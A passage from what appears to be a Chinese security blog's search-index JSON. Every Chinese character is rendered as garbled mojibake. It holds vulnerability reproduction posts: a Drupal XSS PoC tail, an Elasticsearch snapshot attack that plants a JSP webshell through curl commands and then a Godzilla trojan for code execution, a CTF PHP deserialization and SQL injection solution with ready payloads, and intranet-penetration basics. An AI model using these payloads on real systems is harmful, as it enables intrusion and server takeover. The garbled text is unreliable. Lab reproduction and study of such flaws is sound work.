å¦‚å›¾ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼Œå³å¯ä½¿ç”¨PoCæ„é€ æ ·æœ¬å¹¶å®Œæˆä¸Šä¼ åŠŸèƒ½ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç›®æ ‡IP ç¬¬äºŒä¸ªå‚æ•°ä¸ºç›®æ ‡ç«¯å£ã€‚ ![image-20230615212825825](Drupal XSSæ¼æ´ï¼ˆCVE-2019-6341ï¼‰\\image-20230615212825825.png) ä¸Šä¼ æˆåŠŸåï¼Œè®¿é—®å›¾ç‰‡ä½ç½®ï¼Œå³å¯è§¦å‘ XSS æ¼æ´ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ å°–ç«¯ï¼š å› ä¸º Chrome å’Œ FireFox æµè§ˆå™¨è‡ªå¸¦éƒ¨åˆ†è¿‡æ»¤ XSS åŠŸèƒ½ï¼Œæ‰€ä»¥éªŒè¯å­˜åœ¨æ—¶å¯ä½¿ç”¨ Edge æµè§ˆå™¨æˆ–è€… IE æµè§ˆå™¨ã€‚ è®¿é—®çš„å›¾ç‰‡åç§°ä¸º_0çš„åŸå› æ˜¯å› ä¸º Drupal çš„è§„åˆ™æœºåˆ¶ï¼Œå…·ä½“åŸç†è§Drupal 1-click to RCE åˆ†æ /var/www/html/drupal/sites/default/files/pictures/YYYY-MM è¿™é‡Œçš„æ—¶é—´åº”è¯¥æ˜¯ä½ ä¸Šä¼ çš„æ—¶å€™çš„åŒ—äº¬æ—¶é—´å› æ­¤æˆ‘è¿™é‡Œçš„è®¿é—®è·¯å¾„ä¸º http://185.243.241.45:8080/sites/default/files/pictures/2023-06/_0 ![image-20230615213558660](Drupal XSSæ¼æ´ï¼ˆCVE-2019-6341ï¼‰\\image-20230615213558660.png) ä½†ä¸çŸ¥ä¸ºä½•æˆ‘è¿™é‡Œedgeæµè§ˆå™¨ä¹Ÿä¸æ˜¾ç¤ºå¼¹çª—","tags":["CVE"],"categories":["CVEæ¼æ´"]},{"title":"Elasticsearchå†™å…¥webshellæ¼æ´ï¼ˆWooYun-2015-110216ï¼‰","path":"/2023/09/11/elasticsearch-xie-ru-webshell-lou-dong-wooyun-2015-110216/","content":"0x01 æ¼æ´æè¿° ElasticSearchå…·æœ‰å¤‡ä»½æ•°æ®çš„åŠŸèƒ½ï¼Œç”¨æˆ·å¯ä»¥ä¼ å…¥ä¸€ä¸ªè·¯å¾„ï¼Œè®©å…¶å°†æ•°æ®å¤‡ä»½åˆ°è¯¥è·¯å¾„ä¸‹ï¼Œä¸”æ–‡ä»¶åå’Œåç¼€éƒ½å¯æ§ã€‚ æ‰€ä»¥ï¼Œå¦‚æœåŒæ–‡ä»¶ç³»ç»Ÿä¸‹è¿˜è·‘ç€å…¶ä»–æœåŠ¡ï¼Œå¦‚Tomcatã€PHPç­‰ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ElasticSearchçš„å¤‡ä»½åŠŸèƒ½å†™å…¥ä¸€ä¸ªwebshellã€‚ å’ŒCVE-2015-5531ç±»ä¼¼ï¼Œè¯¥æ¼æ´å’Œå¤‡ä»½ä»“åº“æœ‰å…³ã€‚åœ¨elasticsearch1.5.1ä»¥åï¼Œå…¶å°†å¤‡ä»½ä»“åº“çš„æ ¹è·¯å¾„é™åˆ¶åœ¨é…ç½®æ–‡ä»¶çš„é…ç½®é¡¹path.repoä¸­ï¼Œè€Œä¸”å¦‚æœç®¡ç†å‘˜ä¸é…ç½®è¯¥é€‰é¡¹ï¼Œåˆ™é»˜è®¤ä¸èƒ½ä½¿ç”¨è¯¥åŠŸèƒ½ã€‚å³ä½¿ç®¡ç†å‘˜é…ç½®äº†è¯¥é€‰é¡¹ï¼Œwebè·¯å¾„å¦‚æœä¸åœ¨è¯¥ç›®å½•ä¸‹ï¼Œä¹Ÿæ— æ³•å†™å…¥webshellã€‚æ‰€ä»¥è¯¥æ¼æ´å½±å“çš„ElasticSearchç‰ˆæœ¬æ˜¯1.5.xä»¥å‰ã€‚ 0x02 æ¼æ´æ­å»º ç¼–è¯‘ä¸å¯åŠ¨æµ‹è¯•ç¯å¢ƒï¼š docker-compose build docker-compose up -d ç®€å•ä»‹ç»ä¸€ä¸‹æœ¬æµ‹è¯•ç¯å¢ƒã€‚æœ¬æµ‹è¯•ç¯å¢ƒåŒæ—¶è¿è¡Œäº† Tomcat å’Œ ElasticSearchï¼ŒTomcat ç›®å½•åœ¨ /usr/local/tomcatï¼Œweb ç›®å½•æ˜¯ /usr/local/tomcat/webappsï¼›ElasticSearch ç›®å½•åœ¨ /usr/share/elasticsearchã€‚ æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯åˆ©ç”¨ ElasticSearchï¼Œåœ¨ /usr/local/tomcat/webapps ç›®å½•ä¸‹å†™å…¥æˆ‘ä»¬çš„ webshellã€‚ 0x03 æ¼æ´å¤ç° è®¿é—®å­˜åœ¨çš„æ¼æ´é¡µé¢ï¼šï¼ˆ9200ä¸€èˆ¬ä¸ºElasticSearchçš„å¸¸ç”¨ç«¯å£ï¼‰ï¼Œæ­¤æ¼æ´ç¯å¢ƒéœ€è¦ä¸tomcatç»“åˆä½¿ç”¨ï¼Œå‘ç°8080ç«¯å£å­˜åœ¨tomcaté»˜è®¤é…ç½®é¡µé¢ã€‚ å‘ç°9200ç«¯å£å­˜åœ¨elasticsearché¡µé¢ï¼šç‰ˆæœ¬ä¸º1.5.1,ç¡®è®¤å­˜åœ¨æ¼æ´ æµ‹è¯•æµç¨‹ é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ¶æ„ç´¢å¼•æ–‡æ¡£ï¼š curl -XPOST http://ip:9200/yz.jsp/yz.jsp/1 -d' {\"&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%&gt;\":\"test\"}' è¿™é‡Œè¦ç”¨kaliå‘é€ å†åˆ›å»ºä¸€ä¸ªæ¶æ„çš„å­˜å‚¨åº“ï¼Œå…¶ä¸­ location çš„å€¼å³ä¸ºæˆ‘è¦å†™å…¥çš„è·¯å¾„ã€‚ â€‹ å›­é•¿ï¼šè¿™ä¸ª Repositories çš„è·¯å¾„æ¯”è¾ƒæœ‰æ„æ€ï¼Œå› ä¸ºä»–å¯ä»¥å†™åˆ°å¯ä»¥è®¿é—®åˆ°çš„ä»»æ„åœ°æ–¹ï¼Œå¹¶ä¸”å¦‚æœè¿™ä¸ªè·¯å¾„ä¸å­˜åœ¨çš„è¯ä¼šè‡ªåŠ¨åˆ›å»ºã€‚é‚£ä¹Ÿå°±æ˜¯è¯´ä½ å¯ä»¥é€šè¿‡æ–‡ä»¶è®¿é—®åè®®åˆ›å»ºä»»æ„çš„æ–‡ä»¶å¤¹ã€‚ â€‹ è¿™é‡Œæˆ‘æŠŠè¿™ä¸ªè·¯å¾„æŒ‡å‘åˆ°äº† tomcat çš„ web éƒ¨ç½²ç›®å½•ï¼Œå› ä¸ºåªè¦åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹åˆ›å»ºç›®å½• Tomcat å°±ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªæ–°çš„åº”ç”¨ (æ–‡ä»¶åä¸º wwwroot çš„è¯åˆ›å»ºå‡ºæ¥çš„åº”ç”¨åç§°å°±æ˜¯ wwwroot äº†)ã€‚ curl -XPUT 'http://ip:9200/_snapshot/yz.jsp' -d '{ \"type\": \"fs\", \"settings\": { \"location\": \"/usr/local/tomcat/webapps/wwwroot/\", \"compress\": false } }' å­˜å‚¨åº“éªŒè¯å¹¶åˆ›å»º: curl -XPUT \"http://ip:9200/_snapshot/yz.jsp/yz.jsp\" -d '{ \"indices\": \"yz.jsp\", \"ignore_unavailable\": \"true\", \"include_global_state\": false }' å®Œæˆï¼ å‰ä¸‰æ­¥ä¸»è¦æ˜¯åˆ›å»ºä¸€ä¸ªsnapshot-yz.jspè„šæœ¬å‘wwwrootä¸‹çš„test.jspæ–‡ä»¶ä¸­å†™å…¥ä»»æ„å­—ç¬¦ä¸²ï¼‰ è®¿é—® http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jspï¼Œè¿™å°±æ˜¯æˆ‘ä»¬å†™å…¥çš„ webshellã€‚ è¯¥ shell çš„ä½œç”¨æ˜¯å‘ wwwroot ä¸‹çš„ test.jsp æ–‡ä»¶ä¸­å†™å…¥ä»»æ„å­—ç¬¦ä¸²ï¼Œå¦‚ï¼šhttp://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=successã€‚ æˆ‘ä»¬å†è®¿é—® /wwwroot/test.jsp å°±èƒ½çœ‹åˆ° success äº†ï¼š ç°åœ¨æ¥å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå“¥æ–¯æ‹‰ç”Ÿæˆä¸€å¥è¯æœ¨é©¬ï¼š ç”Ÿæˆjspçš„shellï¼š å¦‚ä¸Šå›¾è¿›è¡Œé…ç½®ç”Ÿæˆæœ¨é©¬ã€‚ URLç¼–ç jspçš„shellå¹¶åœ¨f=åè¾“å…¥æ”¹ç¼–ç å¥½çš„shell: è®¿é—®test.jspå‘ç°æˆåŠŸä¸Šä¼ shellï¼Œç›´æ¥å“¥æ–¯æ‹‰è¿æ¥ä¸€ä¸‹ ç‚¹å‡»æµ‹è¯•è¿æ¥å‘ç°æˆåŠŸï¼Œç›´æ¥æ·»åŠ çœ‹çœ‹ å‘ç°æˆåŠŸrce 0x04 ä¿®å¤å»ºè®® 1ã€å‡çº§ç‰ˆæœ¬ 2ã€å°†repoç›®å½•æƒé™è®¾ç½®ä¸ºä»…å¯è¯»ï¼Œä¸å¯å†™ï¼ˆè‡ªå·±å»ºè®®çš„ï¼Œä»…åœ¨ä¸å½±å“ä¸šåŠ¡çš„å‰æä¸‹ï¼‰ 0x05 å‚è€ƒæ–‡ç«  -wooyun-2015-110216 Elasticsearchå†™å…¥webshell æ¼æ´å¤ç°-wooyun-2015-110216-Elasticsearchå†™å…¥webshell Elasticsearchå†™å…¥webshellæ¼æ´ï¼ˆWooYun-2015-110216ï¼‰","tags":["CVE"],"categories":["CVEæ¼æ´"]},{"title":"æ”»é˜²ä¸–ç•Œ-warmup","path":"/2023/09/06/ti-mu-ming-cheng-warmup/","content":"é¢˜ç›®æè¿°ï¼š å¹³å¹³æ— å¥‡çš„è¾“å…¥æ¡† é¢˜ç›®è§£é¢˜ï¼š å…ˆå°è¯•äº†å‡ ä¸‹å¼±å£ä»¤ï¼Œæ²¡ç”¨ï¼Œé‚£çœ‹ä¸€ä¸‹é¢˜ç›®ç»™çš„é™„ä»¶ï¼Œå‘ç°æ˜¯æºç ï¼Œé‚£å¼€å§‹å®¡è®¡ï¼ˆè¿™é‡Œå–å…³é”®éƒ¨åˆ†ï¼‰ conn.php &lt;?php include 'flag.php'; class SQL { public $table = ''; public $username = ''; public $password = ''; public $conn; public function __construct() { } public function connect() { //ä¸æ•°æ®åº“è¿æ¥ $this-&gt;conn = new mysqli(\"localhost\", \"xxxxx\", \"xxxx\", \"xxxx\"); } public function check_login(){ $result = $this-&gt;query(); if ($result === false) {//è¿›è¡Œæ•°æ®åº“çš„æŸ¥è¯¢ die(\"database error, please check your input\"); } $row = $result-&gt;fetch_assoc();//ä»ç»“æœä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ if($row === NULL){ die(\"username or password incorrect!\"); }else if($row['username'] === 'admin'){//è‹¥username=adminåˆ™è¾“å‡ºflag $flag = file_get_contents('flag.php'); echo \"welcome, admin! this is your flag -&gt; \".$flag; }else{ echo \"welcome! but you are not admin\"; } $result-&gt;free(); } public function query() { $this-&gt;waf();//å‚æ•°çš„è¿‡æ»¤ return $this-&gt;conn-&gt;query (\"select username,password from \".$this-&gt;table.\" where username='\".$this-&gt;username.\"' and password='\".$this-&gt;password.\"'\"); } public function waf(){ $blacklist = [\"union\", \"join\", \"!\", \"\\\"\", \"#\", \"$\", \"%\", \"&amp;\", \".\", \"/\", \":\", \";\", \"^\", \"_\", \"`\", \"{\", \"|\", \"}\", \"&lt;\", \"&gt;\", \"?\", \"@\", \"[\", \"\\\\\", \"]\" , \"*\", \"+\", \"-\"];//è®¾ç½®é»‘åå• foreach ($blacklist as $value) { if(strripos($this-&gt;table, $value)){ die('bad hacker,go out!'); } } foreach ($blacklist as $value) { if(strripos($this-&gt;username, $value)){ die('bad hacker,go out!'); } } foreach ($blacklist as $value) {//ä»¥ä¸Šéƒ½æ˜¯foreachå¾ªç¯ï¼Œåˆ†åˆ«æ£€æµ‹tableï¼Œç”¨æˆ·åå’Œå¯†ç æ˜¯å¦æœ‰æ•æ„Ÿå­—ç¬¦ if(strripos($this-&gt;password, $value)){ die('bad hacker,go out!'); } } } public function __wakeup(){//ååºåˆ—åŒ–è‡ªåŠ¨è°ƒç”¨ if (!isset ($this-&gt;conn)) { $this-&gt;connect ();//è¿æ¥æ•°æ®åº“ } if($this-&gt;table){ $this-&gt;waf(); } $this-&gt;check_login(); $this-&gt;conn-&gt;close(); } } ?&gt; index.php &lt;?php include 'conn.php'; include 'flag.php'; if (isset ($_COOKIE['last_login_info'])) { $last_login_info = unserialize (base64_decode ($_COOKIE['last_login_info']));//ä¼ å…¥ä¸€ä¸ªbaseåŠ å¯†çš„cookieå‚æ•° try {\t//æ£€æµ‹ä¼ å…¥çš„å‚æ•°æ˜¯å¦æ˜¯æ•°ç»„ //æ­£åœ¨æµè§ˆå½“å‰é¡µé¢ç”¨æˆ·çš„ IP åœ°å€ã€‚ if (is_array($last_login_info) &amp;&amp; $last_login_info['ip'] != $_SERVER['REMOTE_ADDR']) { die('WAF info: your ip status has been changed, you are dangrous.'); } } catch(Exception $e) { die('Error'); } } else { $cookie = base64_encode (serialize (array ( 'ip' =&gt; $_SERVER['REMOTE_ADDR']))) ; setcookie ('last_login_info', $cookie, time () + (86400 * 30)); } if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])){ $table = 'users'; $username = addslashes($_POST['username']); $password = addslashes($_POST['password']); $sql = new SQL(); $sql-&gt;connect(); $sql-&gt;table = $table; $sql-&gt;username = $username; $sql-&gt;password = $password; $sql-&gt;check_login(); } ?&gt; ip.php &lt;?php echo $_SERVER['REMOTE_ADDR']; å…ˆè®¿é—®ip.phpæ‹¿åˆ°ipï¼š218.26.154.43 è¿™é‡Œçœ‹ä»£ç å‘ç°cookieä¹Ÿä¼šè‡ªåŠ¨è®¾ç½®ï¼Œå› æ­¤æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ å‘ç°ç–‘ä¼¼base64çš„ï¼Œè§£ç ä¸€ä¸‹çœ‹çœ‹ æ–¹æ³•ä¸€ï¼š æ‰€å¾—åˆ°å·²çŸ¥ä¿¡æ¯ 1.åœ¨Cookieä¸­å­˜åœ¨åºåˆ—åŒ–å­—ç¬¦ä¸²,ç”¨æ¥è®°å½•è®¿é—®è€…IP 2.å‰ç«¯ä¼ å…¥username,passwordæ—¶,é¦–å…ˆä¼šè¢«è½¬ä¹‰å†è¿›è¡Œè¿‡æ»¤,åªèƒ½ä½¿ç”¨ â€™ ç¬¦å· 3.åœ¨conn.phpæ–‡ä»¶ä¸­å­˜åœ¨ä¸€ä¸ªSQLæ–¹æ³•,å…¶ä¸­wafè¿‡æ»¤å‡½æ•°å°†table,username,passwordå‚æ•°éƒ½è¿›è¡Œäº†è¿‡æ»¤,ä½†æ˜¯tableå‚æ•°æ²¡æœ‰è¿›è¡Œaddslashes()å‡½æ•°è½¬ä¹‰å¤„ç† æ„é€ poc O:3:\"SQL\":4:{s:5:\"table\";s:41:\"(select 'admin' username,'123' password)a\";s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:3:\"123\";s:4:\"conn\";N;}} è¿™é‡Œè§£é‡Šä¸€ä¸‹tableå†…å®¹çš„å«ä¹‰ï¼š â€™ or â€˜1â€™='1 select å€¼1 å­—æ®µ1ï¼Œå€¼2ï¼Œå­—æ®µ2 å¯ä»¥ç”Ÿæˆè¡¨ å­—æ®µ1 å­—æ®µ2 å€¼1 å€¼2 ä¸Šè¿°å±äºsqlä¸­çš„å­æŸ¥è¯¢ï¼Œä¸”å­æŸ¥è¯¢åé¢å¿…é¡»è·Ÿä¸€ä¸ªåˆ«åï¼Œè§£é‡Šå¦‚ä¸‹ï¼š åœ¨å¤æ‚æŸ¥è¯¢è¯­å¥ä¸­ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šç”¨åˆ°å­æŸ¥è¯¢ã€‚ select id from (select * from table_name)a ä¸Šé¢æˆ‘ä»¬å°†å­æŸ¥è¯¢æŸ¥è¯¢å‡ºæ¥çš„ç»“æœå½“æˆä¸€å¼ æ–°è¡¨æ¥æ“ä½œã€‚åŒæ—¶ï¼Œä¸ºè¿™å¼ æ–°è¡¨æŒ‡å®šäº†åˆ«å a ï¼Œè¿™ä¸ªåˆ«åæ˜¯ä¸€å®šéœ€è¦æŒ‡å®šçš„ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚ æ‰€ä»¥ä¸Šè¿°åºåˆ—åŒ–å­—ç¬¦ä¸²æ‰§è¡Œåï¼Œç›¸å½“äºå»ºç«‹äº†ä¸€ä¸ªæ–°è¡¨ï¼Œåå­—ä¸ºaï¼Œå…¶ä¸­ç”¨æˆ·åå€¼ä¸ºadminï¼Œå¯†ç ä¸º123ã€‚ç¬¦åˆä»£ç ä¸­username=adminçš„è¦æ±‚ base64ç¼–ç åï¼Œä¼ å…¥cookie TzozOiJTUUwiOjQ6e3M6NToidGFibGUiO3M6NDE6IihzZWxlY3QgJ2FkbWluJyB1c2VybmFtZSwnMTIzJyBwYXNzd29yZClhIjtzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7czo0OiJjb25uIjtOO319 å¾—åˆ°flag æ–¹æ³•äºŒï¼š è¿™é‡Œä¹Ÿå¯ä»¥é‡‡ç”¨ç±»ä¼¼å¦‚ä¸‹poc O:3:\"SQL\":5:{s:5:\"table\";s:5:\"users\";s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:11:\"' or '1'='1\";s:4:\"conn\";N;s:10:\"SQL_wakeup\";N;} ç”±äºå‰ç«¯é¡µé¢å¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œäº†å­—ç¬¦è½¬ä¹‰ï¼Œé‚£æˆ‘ä»¬å¯ä»¥é€šè¿‡sqlè¯­å¥æ¥ç»•è¿‡å‰ç«¯è½¬ä¹‰ï¼Œæ¥ç€åœ¨è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢æ—¶ï¼Œç”±äºpassowrdæ˜¯ä¸‡èƒ½å¯†ç ï¼Œäºæ˜¯æˆåŠŸç»•è¿‡ï¼Œå®ç°username=admin å‚è€ƒæ–‡ç« ï¼š ã€æ„šå…¬ç³»åˆ—ã€‘2023å¹´06æœˆ æ”»é˜²ä¸–ç•Œ-Webï¼ˆé¢˜ç›®åç§°-warmupï¼‰ å…¶ä½™å¯ä»¥ç­‰æäº¤äº†flagï¼ŒæŸ¥çœ‹é¢˜ç›®è‡ªå¸¦wp","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"å†…ç½‘æ¸—é€å­¦ä¹ -åŸºç¡€çŸ¥è¯†","path":"/2023/09/05/nei-wang-shen-tou-xue-xi-ji-chu-pian/","content":"å†…ç½‘ä¹ŸæŒ‡å±€åŸŸç½‘ï¼Œæ˜¯æŒ‡åœ¨æŸä¸€åŒºåŸŸç”±å¤šå°è®¡ç®—æœºäº’è¿è€Œæˆçš„è®¡ç®—æœºç»„ã€‚ ä¸€ã€å†…ç½‘åŸºç¡€çŸ¥è¯† 0x01 å·¥ä½œç»„ å¯¹å±€åŸŸç½‘ä¸­çš„è®¡ç®—æœºè¿›è¡Œåˆ†ç±»ï¼Œä½¿å¾—ç½‘ç»œæ›´æœ‰åºã€‚è®¡ç®—æœºçš„ç®¡ç†ä¾ç„¶æ˜¯å„è‡ªä¸ºæ”¿ï¼Œæ‰€æœ‰è®¡ç®—æœºä¾ç„¶æ˜¯å¯¹ç­‰çš„ï¼Œæ¾æ•£ä¼šå‘˜åˆ¶ï¼Œå¯ä»¥éšæ„åŠ å…¥å’Œé€€å‡ºï¼Œä¸”ä¸åŒå·¥ä½œç»„ä¹‹é—´çš„å…±äº«èµ„æºå¯ä»¥ç›¸äº’è®¿é—®ã€‚ 0x02 åŸŸ åˆ†ç±»ï¼šå•åŸŸã€å­åŸŸã€çˆ¶åŸŸã€åŸŸæ ‘ã€åŸŸæ£®æ—ã€DNSåŸŸåæœåŠ¡å™¨ â€œåŸŸâ€æ˜¯ä¸€ä¸ªæœ‰å®‰å…¨è¾¹ç•Œçš„è®¡ç®—æœºç»„åˆï¼ˆä¸€ä¸ªåŸŸä¸­çš„ç”¨æˆ·æ— æ³•è®¿é—®å¦ä¸€ä¸ªåŸŸä¸­çš„èµ„æºï¼‰ï¼ŒåŸŸå†…èµ„æºç”±ä¸€å°åŸŸæ§åˆ¶å™¨ï¼ˆDomain Controllerï¼ŒDCï¼‰é›†ä¸­ç®¡ç†ï¼Œç”¨æˆ·åå’Œå¯†ç æ˜¯æ”¾åœ¨åŸŸæ§åˆ¶å™¨å»éªŒè¯çš„ã€‚ ä¼˜ç‚¹ï¼šé€šè¿‡ç»„ç­–ç•¥æ¥ç»Ÿä¸€ç®¡ç†ã€‚ å•åŸŸï¼šå³åªæœ‰ä¸€ä¸ªåŸŸçš„ç½‘ç»œç¯å¢ƒï¼Œä¸€èˆ¬éœ€è¦ä¸¤å°DCï¼Œä¸€å°DCï¼Œå¦ä¸€å°å¤‡ç”¨DCï¼ˆå®¹ç¾ï¼‰ çˆ¶å­åŸŸï¼šç±»æ¯”å…¬å¸æ€»éƒ¨å’Œå…¬å¸åˆ†éƒ¨çš„å…³ç³»ï¼Œæ€»éƒ¨çš„åŸŸç§°ä¸ºçˆ¶åŸŸï¼Œå„åˆ†éƒ¨çš„åŸŸç§°ä¸ºè¯¥åŸŸçš„å­åŸŸã€‚ä½¿ç”¨çˆ¶å­åŸŸçš„å¥½å¤„ï¼š å‡å°äº†åŸŸä¹‹é—´ä¿¡æ¯äº¤äº’çš„å‹åŠ›ï¼ˆåŸŸå†…ä¿¡æ¯äº¤äº’ä¸ä¼šå‹ç¼©ï¼ŒåŸŸé—´ä¿¡æ¯äº¤äº’å¯å‹ç¼©ï¼‰ ä¸åŒçš„å­åŸŸå¯ä»¥æŒ‡å®šç‰¹å®šçš„å®‰å…¨ç­–ç•¥ çˆ¶å­åŸŸä¸­åŸŸåä½¿ç”¨ä¸€ä¸ª.è¡¨ç¤ºä¸€ä¸ªå±‚æ¬¡ï¼Œç±»ä¼¼äºDNSåŸŸåè¡¨ç¤ºæ–¹å¼ï¼Œå­åŸŸåªèƒ½ä½¿ç”¨çˆ¶åŸŸçš„åå­—ä½œä¸ºåŸŸååç¼€ åŸŸæ ‘ï¼šå¤šä¸ªåŸŸé€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„é›†åˆã€‚è‹¥ä¸¤ä¸ªåŸŸä¹‹é—´éœ€è¦ç›¸äº’è®¿é—®ï¼Œéœ€è¦å»ºç«‹ä¿¡ä»»å…³ç³»ï¼ˆTrust Relationï¼‰ï¼Œé€šè¿‡ä¿¡ä»»å…³ç³»å¯ä»¥å°†çˆ¶å­åŸŸè¿æ¥æˆæ ‘çŠ¶ç»“æ„ åŸŸæ£®æ—ï¼šå¤šä¸ªåŸŸæ ‘é€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„é›†åˆã€‚ DNSåŸŸåæœåŠ¡å™¨ï¼šå®ç°åŸŸååˆ°IPåœ°å€çš„è½¬æ¢ã€‚ç”±äºåŸŸä¸­è®¡ç®—æœºä½¿ç”¨DNSæ¥å®šä½DCã€æœåŠ¡å™¨å’Œå…¶ä»–è®¡ç®—æœºï¼Œæ‰€ä»¥åŸŸçš„åå­—å°±æ˜¯DNSåŸŸçš„åå­—ã€‚ å†…ç½‘æ¸—é€ä¸­ï¼Œå¤§éƒ½æ˜¯é€šè¿‡å¯»æ‰¾DNSæœåŠ¡å™¨æ¥ç¡®å®šåŸŸæ§åˆ¶å™¨ä½ç½®ï¼ˆå› ä¸ºDNSæœåŠ¡å™¨å’ŒåŸŸæ§åˆ¶å™¨é€šå¸¸é…ç½®åœ¨ä¸€å°æœºå™¨ä¸Šï¼‰ 0x03 æ´»åŠ¨ç›®å½• æ´»åŠ¨ç›®å½•ï¼ˆActive Directoryï¼ŒADï¼‰æ˜¯æŒ‡åŸŸç¯å¢ƒä¸­æä¾›ç›®å½•æœåŠ¡çš„ç»„ä»¶ï¼Œç”¨äºå­˜å‚¨æœ‰å…³ç½‘ç»œå¯¹è±¡ï¼ˆç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºã€å…±äº«èµ„æºã€è”ç³»äººï¼‰çš„ä¿¡æ¯ã€‚åŸºäºæ´»åŠ¨ç›®å½•æœ‰ç›®å½•æœåŠ¡ï¼Œç”¨äºå¸®åŠ©ç”¨æˆ·ä»æ´»åŠ¨ç›®å½•ä¸­å¿«é€Ÿæ‰¾åˆ°æ‰€éœ€çš„æ¶ˆæ¯ã€‚æ´»åŠ¨ç›®å½•ä½¿å¾—ä¼ä¸šå¯ä»¥å¯¹ç½‘ç»œç¯å¢ƒè¿›è¡Œé›†ä¸­ç®¡ç†ã€‚ï¼ˆå¯ç±»æ¯”ä¸ºå†…ç½‘ä¸­çš„ç´¢å¼•ï¼Œé‡Œé¢å­˜å‚¨æœ‰å†…ç½‘é‡Œæ‰€æœ‰èµ„æºçš„å¿«æ·æ–¹å¼ï¼‰ æ´»åŠ¨ç›®å½•çš„é€»è¾‘ç»“æ„åŒ…å«ç»„ç»‡å•å…ƒã€åŸŸã€åŸŸæ ‘ã€åŸŸæ£®æ—ã€‚åŸŸæ ‘å†…çš„æ‰€æœ‰åŸŸå…±äº«ä¸€ä¸ªæ´»åŠ¨ç›®å½•ï¼Œå› æ­¤éå¸¸é€‚åˆè¿›è¡Œç»Ÿä¸€ç®¡ç†ã€‚ æ´»åŠ¨ç›®å½•çš„åŠŸèƒ½ï¼š è´¦å·é›†ä¸­ç®¡ç† è½¯ä»¶é›†ä¸­ç®¡ç† ç¯å¢ƒé›†ä¸­ç®¡ç† å¢å¼ºå®‰å…¨æ€§ æ›´å¯é ã€æ›´çŸ­çš„å®•æœºæ—¶é—´ **åŸŸå’Œæ´»åŠ¨ç›®å½•çš„åŒºåˆ«ï¼š**è¦å®ç°åŸŸç¯å¢ƒï¼Œå…¶å®å°±æ˜¯è¦å®‰è£…ADã€‚ä¸€å°è®¡ç®—æœºå®‰è£…äº†ADä¹‹åå°±å˜æˆäº†DCã€‚ ä¸‹é¢è§£é‡Šä¸€ä¸‹ADä¸DCçš„åŒºåˆ« 0x04 ADä¸DCçš„åŒºåˆ« å¦‚æœç½‘ç»œè§„æ¨¡è¾ƒå¤§ï¼Œæˆ‘ä»¬å°±ä¼šè€ƒè™‘æŠŠç½‘ç»œä¸­çš„ä¼—å¤šå¯¹è±¡ï¼šè®¡ç®—æœºã€ç”¨æˆ·ã€ç”¨æˆ·ç»„ã€æ‰“å°æœºã€å…±äº«æ–‡ä»¶ç­‰ï¼Œåˆ†é—¨åˆ«ç±»ã€äº•ç„¶æœ‰åºåœ°æ”¾åœ¨ä¸€ä¸ªå¤§ä»“åº“ä¸­ï¼Œå¹¶åšå¥½æ£€ç´¢ä¿¡æ¯ï¼Œä»¥åˆ©äºæŸ¥æ‰¾ã€ç®¡ç†å’Œä½¿ç”¨è¿™äº›å¯¹è±¡ï¼ˆèµ„æºï¼‰ã€‚è¿™ä¸ªæœ‰å±‚æ¬¡ç»“æ„çš„æ•°æ®åº“ï¼Œå°±æ˜¯æ´»åŠ¨ç›®å½•æ•°æ®åº“ï¼Œç®€ç§°ADåº“ã€‚ é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æŠŠè¿™ä¸ªæ•°æ®åº“æ”¾åœ¨å“ªå°è®¡ç®—æœºä¸Šå‘¢ï¼Ÿè§„å®šæ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¬æŠŠå­˜æ”¾æœ‰æ´»åŠ¨ç›®å½•æ•°æ®åº“çš„è®¡ç®—æœºå°±ç§°ä¸ºDCã€‚æ‰€ä»¥è¯´æˆ‘ä»¬è¦å®ç°åŸŸç¯å¢ƒï¼Œå…¶å®å°±æ˜¯è¦å®‰è£…ADï¼Œå½“å†…ç½‘ä¸­çš„ä¸€å°è®¡ç®—æœºå®‰è£…äº†ADåï¼Œå®ƒå°±å˜æˆäº†DCã€‚ é‚£ä¹ˆæœ‰äº†åŸŸç¯å¢ƒçš„è¯ï¼Œå›ç­”æœ€åˆçš„é—®é¢˜ï¼šåœ¨åŸŸç¯å¢ƒä¸­ï¼Œåªéœ€è¦åœ¨æ´»åŠ¨ç›®å½•ä¸­åˆ›å»ºä¸€æ¬¡Alanè´¦æˆ·ï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨ä»»æ„200å°ç”µè„‘ä¸­çš„ä¸€å°ä¸Šç™»å½•Alanï¼Œå¦‚æœè¦ä¸ºAlanè´¦æˆ·æ›´æ”¹å¯†ç ï¼Œåªéœ€è¦åœ¨æ´»åŠ¨ç›®å½•ä¸­æ›´æ”¹ä¸€æ¬¡å°±å¯ä»¥äº†ã€‚ 0x05 å®‰å…¨åŸŸçš„åˆ’åˆ† 5.1 å†…ç½‘ 